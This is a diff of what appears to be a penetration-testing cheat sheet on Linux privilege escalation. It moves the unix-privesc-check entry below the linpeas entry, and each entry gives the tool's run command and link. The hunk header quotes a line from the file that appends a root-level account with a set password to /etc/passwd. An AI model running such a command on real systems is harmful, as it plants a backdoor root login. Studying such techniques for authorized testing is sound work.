@@ -44,14 +44,15 @@ echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
 
 ### Linux Enumeration Tools 
-#### Unix Privesc Check
-```
-./unix-privesc-check
-```
-https://pentestmonkey.net/tools/audit/unix-privesc-check
 
 #### Linpeas
 ```
 ./linpeas.sh
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+#### Unix Privesc Check
+```
+./unix-privesc-check
+```
+https://pentestmonkey.net/tools/audit/unix-privesc-check
